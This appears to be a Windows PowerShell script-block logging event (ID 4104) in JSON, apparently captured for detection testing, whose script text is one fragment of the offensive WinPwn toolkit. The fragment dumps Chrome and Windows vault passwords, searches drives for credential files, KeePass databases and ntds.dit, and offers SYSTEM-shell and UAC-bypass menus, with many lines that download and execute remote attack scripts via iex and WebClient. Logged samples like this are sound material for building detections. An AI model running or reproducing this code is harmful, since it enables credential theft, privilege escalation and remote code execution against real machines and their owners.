{
  "Event": {
    "#attributes": {
      "xmlns": "http://schemas.microsoft.com/win/2004/08/events/event"
    },
    "System": {
      "Provider": {
        "#attributes": {
          "Name": "Microsoft-Windows-PowerShell",
          "Guid": "A0C1853B-5C40-4B15-8766-3CF1C58F985A"
        }
      },
      "EventID": 4104,
      "Version": 1,
      "Level": 3,
      "Task": 2,
      "Opcode": 15,
      "Keywords": "0x0",
      "TimeCreated": {
        "#attributes": {
          "SystemTime": "2025-12-23T12:25:40.169102Z"
        }
      },
      "EventRecordID": 3160,
      "Correlation": {
        "#attributes": {
          "ActivityID": "B908F131-6DEE-0001-A801-39B9EE6DDC01"
        }
      },
      "Execution": {
        "#attributes": {
          "ProcessID": 23052,
          "ThreadID": 9920
        }
      },
      "Channel": "Microsoft-Windows-PowerShell/Operational",
      "Computer": "swachchhanda",
      "Security": {
        "#attributes": {
          "UserID": "S-1-5-21-2555720767-1205513275-3893774561-1001"
        }
      }
    },
    "EventData": {
      "MessageNumber": 6,
      "MessageTotal": 14,
      "ScriptBlockText": "lor Yellow '-------> List running tasks'\r\n     if(!$consoleoutput){Get-WmiObject -Query \"Select * from Win32_Process\" | where {$_.Name -notlike \"svchost*\"} | Select Name, Handle, @{Label=\"Owner\";Expression={$_.GetOwner().User}} | ft -AutoSize >> \"$currentPath\\LocalRecon\\RunningTasks.txt\"}else{Get-WmiObject -Query \"Select * from Win32_Process\" | where {$_.Name -notlike \"svchost*\"} | Select Name, Handle, @{Label=\"Owner\";Expression={$_.GetOwner().User}} | ft -AutoSize}\r\n\r\n     Write-Host -ForegroundColor Yellow '-------> Checking for usable credentials (cmdkey /list)'\r\n     if(!$consoleoutput){cmdkey /list >> \"$currentPath\\Vulnerabilities\\SavedCredentials.txt\"}else{cmdkey /list} # runas /savecred /user:WORKGROUP\\Administrator \"\\\\10.XXX.XXX.XXX\\SHARE\\evil.exe\"\r\n}\r\n\r\n\r\n# Looking for Event logs via  djhohnsteins c# eventlog parser ported to powershell\r\nfunction Powershellsensitive\r\n{\r\n    Param (\r\n    [Switch]\r\n    $consoleoutput,\r\n    [Switch]\r\n    $noninteractive   \r\n  )\r\n    if(!$consoleoutput){pathcheck}\r\n    $currentPath = (Get-Item -Path \".\\\" -Verbose).FullName\r\n  Write-Host -ForegroundColor Yellow '-------> Parsing Event logs for sensitive Information:'\r\n    iex(new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/Creds/master/PowershellScripts/Invoke-EventLogparser.ps1')\r\n  if(!$consoleoutput){\r\n    [EventLogParser.EventLogHelpers]::Parse4104Events(\"$currentPath\\LocalRecon\\EventLog4013SensitiveInformations.txt\",\"5\")\r\n    [EventLogParser.EventLogHelpers]::Parse4103Events()\r\n    Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational'; ID=4104} | Select-Object -Property Message | Select-String -Pattern 'SecureString' >> \"$currentPath\\LocalRecon\\Powershell_Logs.txt\" \r\n    if (isadmin){[EventLogParser.EventLogHelpers]::Parse4688Events()}\r\n    }\r\n    else\r\n    {\r\n        [EventLogParser.EventLogHelpers]::Parse4104Events(\" \",\"5\")\r\n      [EventLogParser.EventLogHelpers]::Parse4103Events()\r\n      Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational'; ID=4104} | Select-Object -Property Message | Select-String -Pattern 'SecureString' \r\n        if (isadmin){[EventLogParser.EventLogHelpers]::Parse4688Events()}\r\n    }\r\n}\r\n\r\nfunction Dotnet{\r\n   Param (\r\n    [Switch]\r\n    $consoleoutput,\r\n    [Switch]\r\n    $noninteractive   \r\n  )\r\n    if(!$consoleoutput){pathcheck}\r\n    $currentPath = (Get-Item -Path \".\\\" -Verbose).FullName\r\n    Write-Host -ForegroundColor Yellow '-------> Searching for .NET Services on this system:'\r\n    #Lee Christensen's .NET Binary searcher\r\n    iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/Creds/master/PowershellScripts/Get-DotNetServices.ps1')\r\n    if(!$consoleoutput){Get-DotNetServices  >> \"$currentPath\\LocalRecon\\DotNetBinaries.txt\"}else{Get-DotNetServices}\r\n}\r\n\r\nfunction Morerecon{\r\n    Param (\r\n    [Switch]\r\n    $consoleoutput,\r\n    [Switch]\r\n    $noninteractive   \r\n  )\r\n    if(!$consoleoutput){pathcheck}\r\n    $currentPath = (Get-Item -Path \".\\\" -Verbose).FullName\r\n    if (isadmin)\r\n    {\r\n        \r\n        # P0wersploits local recon function\r\n        IEX (New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + '/Creds/master/PowershellScripts/Get-ComputerDetails.ps1')\r\n    \r\n        Write-Host -ForegroundColor Yellow '-------> Dumping general computer information '\r\n        if(!$consoleoutput){Get-ComputerDetails >> \"$currentPath\\LocalRecon\\Computerdetails.txt\"}else{Get-ComputerDetails}\r\n\r\n    }\r\n}\r\n\r\nfunction Sensitivefiles{\r\n    Param (\r\n    [Switch]\r\n    $consoleoutput,\r\n    [Switch]\r\n    $noninteractive   \r\n  )    \r\n    if(!$consoleoutput){pathcheck}\r\n    $currentPath = (Get-Item -Path \".\\\" -Verbose).FullName\r\n    # obfuscated + string replaced p0werview\r\n    IEX (New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + '/Creds/master/obfuscatedps/find-interesting.ps1')\r\n    if(!$consoleoutput){\r\n        Write-Host -ForegroundColor Yellow 'Looking for interesting files:'\r\n        try{Find-InterestingFile -Path 'C:\\' >> \"$currentPath\\LocalRecon\\InterestingFiles.txt\"}catch{Write-Host \":-(\"}\r\n        try{Find-InterestingFile -Path 'C:\\' -Terms pass,login,rdp,kdbx,backup >> \"$currentPath\\LocalRecon\\MoreFiles.txt\"}catch{Write-Host \":-(\"}\r\n        Write-Verbose \"Enumerating more interesting files...\"\r\n\r\n        $SearchStrings = \"*secret*\",\"*net use*\",\"*.kdb*\",\"*creds*\",\"*credential*\",\"*.vmdk\",\"*confidential*\",\"*proprietary*\",\"*pass*\",\"*credentials*\",\"web.config\",\"KeePass.config*\",\"*.kdbx\",\"*.key\",\"tnsnames.ora\",\"ntds.dit\",\"*.dll.config\",\"*.exe.config\"\r\n        $IndexedFiles = Foreach ($String in $SearchStrings) {Get-IndexedFiles $string}\r\n\r\n        $IndexedFiles |Format-List |Out-String -width 500 >> \"$currentPath\\LocalRecon\\Sensitivelocalfiles.txt\"\r\n        GCI $ENV:USERPROFILE\\ -recurse -include *pass*,*diagram*,*.pdf,*.vsd,*.doc,*docx,*.xls,*.xlsx,*.kdbx,*.kdb,*.rdp,*.key,KeePass.config | Select-Object Fullname,LastWriteTimeUTC,LastAccessTimeUTC,Length | Format-Table -auto | Out-String -width 500 >> \"$currentPath\\LocalRecon\\MoreSensitivelocalfiles.txt\"\r\n    }\r\n    else\r\n    {\r\n        Write-Host -ForegroundColor Yellow 'Looking for interesting files:'\r\n        try{Find-InterestingFile -Path 'C:\\'}catch{Write-Host \":-(\"}\r\n        try{Find-InterestingFile -Path 'C:\\' -Terms pass,login,rdp,kdbx,backup }catch{Write-Host \":-(\"}\r\n        Write-Verbose \"Enumerating more interesting files...\"\r\n\r\n        $SearchStrings = \"*secret*\",\"*net use*\",\"*.kdb*\",\"*creds*\",\"*credential*\",\"*.vmdk\",\"*confidential*\",\"*proprietary*\",\"*pass*\",\"*credentials*\",\"web.config\",\"KeePass.config*\",\"*.kdbx\",\"*.key\",\"tnsnames.ora\",\"ntds.dit\",\"*.dll.config\",\"*.exe.config\"\r\n        $IndexedFiles = Foreach ($String in $SearchStrings) {Get-IndexedFiles $string}\r\n\r\n        $IndexedFiles |Format-List |Out-String -width 500 \r\n        GCI $ENV:USERPROFILE\\ -recurse -include *pass*,*diagram*,*.pdf,*.vsd,*.doc,*docx,*.xls,*.xlsx,*.kdbx,*.kdb,*.rdp,*.key,KeePass.config | Select-Object Fullname,LastWriteTimeUTC,LastAccessTimeUTC,Length | Format-Table -auto | Out-String -width 500 \r\n    }\r\n}\r\n\r\nfunction Browserpwn{\r\n    Param (\r\n    [Switch]\r\n    $consoleoutput,\r\n    [Switch]\r\n    $noninteractive   \r\n  )\r\n    if(!$consoleoutput){pathcheck}\r\n    $currentPath = (Get-Item -Path \".\\\" -Verbose).FullName\r\n    $chrome = \"yes\"\r\n    if (!$noninteractive){$chrome = Read-Host -Prompt 'Dump Chrome Browser history and maybe passwords? (yes/no)'}\r\n    if ($chrome -eq \"yes\" -or $chrome -eq \"y\" -or $chrome -eq \"Yes\" -or $chrome -eq \"Y\")\r\n    {\r\n        # Lee Christensen's Chrome-Dump Script\r\n        iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/Creds/master/PowershellScripts/Get-ChromeDump.ps1')\r\n        try\r\n        {\r\n            Install-SqlLiteAssembly\r\n            if(!$consoleoutput){\r\n                Get-ChromeDump >> \"$currentPath\\Exploitation\\Chrome_Credentials.txt\"\r\n                Get-ChromeHistory >> \"$currentPath\\LocalRecon\\ChromeHistory.txt\"\r\n            }\r\n            else{\r\n                Get-ChromeDump\r\n                Get-ChromeHistory\r\n            }\r\n            Write-Host -ForegroundColor Yellow 'Done, look in the localrecon folder for creds/history:'\r\n        }\r\n        catch{}\r\n    }\r\n    $IE = \"yes\"\r\n    if (!$noninteractive){$IE = Read-Host -Prompt 'Dump IE / Edge Browser passwords? (yes/no)'}\r\n    if ($IE -eq \"yes\" -or $IE -eq \"y\" -or $IE -eq \"Yes\" -or $IE -eq \"Y\")\r\n    {\r\n        [void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]\r\n        $vault = New-Object Windows.Security.Credentials.PasswordVault \r\n        if(!$consoleoutput){$vault.RetrieveAll() | % { $_.RetrievePassword();$_ } >> \"$currentPath\\Exploitation\\InternetExplorer_Credentials.txt\"}else{$vault.RetrieveAll() | % { $_.RetrievePassword();$_ }}\r\n    }\r\n    $browserinfos = \"yes\"\r\n    if (!$noninteractive){$browserinfos = Read-Host -Prompt 'Dump all installed Browser history and bookmarks? (yes/no)'}\r\n    if ($browserinfos -eq \"yes\" -or $browserinfos -eq \"y\" -or $browserinfos -eq \"Yes\" -or $browserinfos -eq \"Y\")\r\n    {\r\n        # Stolen from Steve Borosh @rvrsh3ll\r\n        IEX (New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + '/Creds/master/PowershellScripts/Get-BrowserInformation.ps1')\r\n        if(!$consoleoutput){Get-BrowserInformation | out-string -Width 4096 >> \"$currentPath\\LocalRecon\\AllBrowserHistory.txt\"}else{Get-BrowserInformation | out-string -Width 4096}\r\n    }\r\n}\r\n\r\nfunction Get-IndexedFiles \r\n{\r\n     param (\r\n     [Parameter(Mandatory=$true)][string]$Pattern)  \r\n     \r\n     $drives = (Get-PSDrive -PSProvider FileSystem).Root\r\n     foreach ($drive in $drives)\r\n     {\r\n     Write-Host -ForegroundColor Yellow \"Searching for files in drive $drive\" \r\n     $Path = $drive \r\n        \r\n     $pattern = $pattern -replace \"\\*\", \"%\"  \r\n     $path = $path + \"\\%\"\r\n    \r\n     $con = New-Object -ComObject ADODB.Connection\r\n     $rs = New-Object -ComObject ADODB.Recordset\r\n    \r\n     Try {\r\n     $con.Open(\"Provider=Search.CollatorDSO;Extended Properties='Application=Windows';\")}\r\n     Catch {\r\n      \"[-] Indexed file search provider not available\";Break\r\n     }\r\n     $rs.Open(\"SELECT System.ItemPathDisplay FROM SYSTEMINDEX WHERE System.FileName LIKE '\" + $pattern + \"' \" , $con)\r\n    \r\n     While(-Not $rs.EOF){\r\n      $rs.Fields.Item(\"System.ItemPathDisplay\").Value\r\n      $rs.MoveNext()\r\n     }\r\n     }\r\n}\r\n\r\nfunction Dotnetsearch\r\n{\r\n    Param (\r\n    [Switch]\r\n    $consoleoutput,\r\n    [Switch]\r\n    $noninteractive   \r\n  )\r\n    # Copied from https://gist.github.com/TheWover/49c5cfd0bbcd4b6c54eb1bb29812ce6e\r\n    Param([parameter(Mandatory=$true,\r\n       HelpMessage=\"Directory to search for .NET Assemblies in.\")]\r\n       $Directory,\r\n       [parameter(Mandatory=$false,\r\n       HelpMessage=\"Whether or not to search recursively.\")]\r\n       [switch]$Recurse = $true,\r\n       [parameter(Mandatory=$false,\r\n       HelpMessage=\"Whether or not to include DLLs in the search.\")]\r\n       [switch]$DLLs = $true,\r\n       [parameter(Mandatory=$false,\r\n       HelpMessage=\"Whether or not to include all files in the search.\")]\r\n       [switch]$All = $true,\r\n       [Switch]$consoleoutput,\r\n       [Switch]$noninteractive \r\n       )\r\n    \r\n    if(!$consoleoutput){pathcheck}\r\n    $currentPath = (Get-Item -Path \".\\\" -Verbose).FullName\r\n    if($noninteractive -and $consoleoutput)\r\n    {\r\n        Write-Host \"-------> Searching for installed .NET Binaries under Program Files \"\r\n        Get-ChildItem -Path 'C:\\Program Files' -Recurse -ErrorAction SilentlyContinue -Force  | % { try {$asn = [System.Reflection.AssemblyName]::GetAssemblyName($_.fullname); $_.fullname } catch {} }\r\n        Write-Host \"-------> Searching for installed .NET Binaries under Program Files (x86)\"\r\n        Get-ChildItem -Path 'C:\\Program Files (x86)' -Recurse -ErrorAction SilentlyContinue -Force  | % { try {$asn = [System.Reflection.AssemblyName]::GetAssemblyName($_.fullname); $_.fullname } catch {} }\r\n    }\r\n    if($All)\r\n    {\r\n        Get-ChildItem -Path $Directory -Recurse:$Recurse -ErrorAction SilentlyContinue -Force  | % { try {$asn = [System.Reflection.AssemblyName]::GetAssemblyName($_.fullname); $_.fullname >> \"$currentPath\\DotNetBinaries.txt\"} catch {} }\r\n        type \"$currentPath\\DotNetBinaries.txt\"\r\n        Sleep(4)\r\n    }\r\n    else\r\n    {\r\n        Get-ChildItem -Path $Directory -Filter *.exe -Recurse:$Recurse -ErrorAction SilentlyContinue -Force  | % { try {$asn = [System.Reflection.AssemblyName]::GetAssemblyName($_.fullname); $_.fullname >> \"$currentPath\\DotNetBinaries.txt\"} catch {} }\r\n        \r\n        if ($DLLs)\r\n        {\r\n            Get-ChildItem -Path $Directory -Filter *.dll -Recurse:$Recurse -ErrorAction SilentlyContinue -Force  | % { try {$asn = [System.Reflection.AssemblyName]::GetAssemblyName($_.fullname); $_.fullname >> \"$currentPath\\DotNetBinaries.txt\"} catch {} }\r\n        }\r\n        type \"$currentPath\\DotNetBinaries.txt\"\r\n        Sleep(4)\r\n    }\r\n\r\n}\r\n\r\nfunction SYSTEMShell\r\n{\r\n    pathcheck\r\n    $currentPath = (Get-Item -Path \".\\\" -Verbose).FullName\r\n    @'\r\n\r\n             \r\n__        ___       ____                 \r\n\\ \\      / (_)_ __ |  _ \\__      ___ __  \r\n \\ \\ /\\ / /| | '_ \\| |_) \\ \\ /\\ / | '_ \\ \r\n  \\ V  V / | | | | |  __/ \\ V  V /| | | |\r\n   \\_/\\_/  |_|_| |_|_|     \\_/\\_/ |_| |_|\r\n\r\n   --> SYSTEM Shellz @S3cur3Th1sSh1t\r\n\r\n'@\r\n    \r\n    do\r\n    {\r\n        Write-Host \"================ WinPwn ================\"\r\n        Write-Host -ForegroundColor Green '1. Pop System Shell using CreateProcess!'\r\n        Write-Host -ForegroundColor Green '2. Bind System Shell using CreateProcess! '\r\n        Write-Host -ForegroundColor Green '3. Pop System Shell using NamedPipe Impersonation! '\r\n        Write-Host -ForegroundColor Green '4. Bind System Shell using UsoClient DLL load!'\r\n    Write-Host -ForegroundColor Green '5. Pop System Shell using Token Manipulation!'\r\n        Write-Host -ForegroundColor Green '6. Go back '\r\n        Write-Host \"================ WinPwn ================\"\r\n        $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'\r\n        Switch ($masterquestion) \r\n        {\r\n             1{iex(new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/Get-System-Techniques/master/CreateProcess/Get-CreateProcessSystem.ps1')}\r\n             2{iex(new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/Get-System-Techniques/master/CreateProcess/Get-CreateProcessSystemBind.ps1')}\r\n             3{iex(new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/Get-System-Techniques/master/NamedPipe/NamedPipeSystem.ps1')}\r\n             4{iex(new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/Get-System-Techniques/master/UsoDLL/Get-UsoClientDLLSystem.ps1')}\r\n       5{iex(new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/Get-System-Techniques/master/TokenManipulation/Get-WinlogonTokenSystem.ps1');Get-WinLogonTokenSystem}\r\n       }\r\n    }\r\n  While ($masterquestion -ne 6)\r\n\r\n}\r\n\r\nfunction UACBypass\r\n{\r\n    [CmdletBinding()]\r\n    Param (\r\n        [Switch]\r\n        $noninteractive,\r\n        [Switch]\r\n        $consoleoutput,\r\n        [string]\r\n        $command,\r\n        [string]\r\n        $technique   \r\n    )\r\n\r\n    if((!$consoleoutput) -or ($noninteractive)){pathcheck}\r\n    $currentPath = (Get-Item -Path \".\\\" -Verbose).FullName\r\n    @'\r\n\r\n             \r\n__        ___       ____                 \r\n\\ \\      / (_)_ __ |  _ \\__      ___ __  \r\n \\ \\ /\\ / /| | '_ \\| |_) \\ \\ /\\ / | '_ \\ \r\n  \\ V  V / | | | | |  __/ \\ V  V /| | | |\r\n   \\_/\\_/  |_|_| |_|_|     \\_/\\_/ |_| |_|\r\n\r\n   --> UAC Bypass\r\n\r\n'@\r\n    if($noninteractive)\r\n    {\r\n        if ($technique -eq \"ccmstp\")\r\n        {\r\n            iex(new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/Creds/master/obfuscatedps/uaccmstp.ps1')\r\n            uaccmstp -BinFile $command\r\n        }\r\n        elseif($technique -eq \"magic\")\r\n        {\r\n            iex(new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/Creds/master/obfuscatedps/uacmagic.ps1')\r\n            uacmagic -BinPath $command\r\n        }\r\n        elseif ($technique -eq \"DiskCleanup\")\r\n        {\r\n            iex(new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/Creds/master/obfuscatedps/diskcleanupuac.ps1')\r\n            DiskCleanupBypass -command $command\r\n        }\r\n        return\r\n    }\r\n    \r\n    do\r\n    {\r\n        Write-Host \"================ WinPwn ================\"\r\n        Write-Host -ForegroundColor Green '1. UAC Magic, specify Binary!'\r\n        Write-Host -ForegroundColor Green '2. UAC Bypass ccmstp technique, specify Binary! '\r\n        Write-Host -ForegroundColor Green '3. DiskCleanup UAC Bypass, specify Binary! '\r\n        Write-Host -ForegroundColor Green '4. DccwBypassUAC technique, only cmd shell pop up!'\r\n        Write-Host -ForegroundColor Green '5. Go back '\r\n        Write-Host \"================ WinPwn ================\"\r\n        $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'\r\n        Switch ($masterquestion) \r\n        {\r\n             1{$command = Read-Host -Prompt 'Enter the Command or executable PATH to execute:';iex(new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/Creds/master/obfuscatedps/uacmagic.ps1'); uacmagic -BinPath $command}\r\n             2{$command = Read-Host -Prompt 'Enter the Command or executable PATH to execute:';iex(new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/Creds/master/obfuscatedps/uaccmstp.ps1');uaccmstp -BinFile $command}\r\n             3{$command = Read-Host -Prompt 'Enter the Command or executable PATH to execute:';iex(new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/Creds/master/obfuscatedps/diskcleanupuac.ps1');DiskCleanupBypass -command $command}\r\n             4{$command = Read-Host -Prompt 'Enter the Command or executable PATH to execute:';iex(new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/Creds/master/obfuscatedps/dccuac.ps1')}",
      "ScriptBlockId": "0047f305-d1db-422c-a99f-b44ff657547e",
      "Path": ""
    }
  }
}
